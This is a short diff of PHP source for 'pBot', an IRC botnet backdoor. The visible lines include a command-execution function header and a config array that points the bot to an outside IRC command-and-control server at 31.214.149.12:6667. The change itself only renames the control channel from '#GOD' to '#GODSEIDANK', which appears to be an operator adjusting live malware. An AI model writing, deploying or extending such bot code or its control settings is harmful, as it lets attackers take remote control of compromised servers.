@@ -83,7 +83,7 @@ function Exe($command)
  
 class pBot
 {
- var $config = array("server"=>"31.214.149.12", "port"=>"6667","key"=>"","prefix"=>"", "maxrand"=>"6", "chan"=>"#GOD","trigger"=>"-","hostauth"=>"localhost");
+ var $config = array("server"=>"31.214.149.12", "port"=>"6667","key"=>"","prefix"=>"", "maxrand"=>"6", "chan"=>"#GODSEIDANK","trigger"=>"-","hostauth"=>"localhost");
  var $users = array();
  function start()
  {
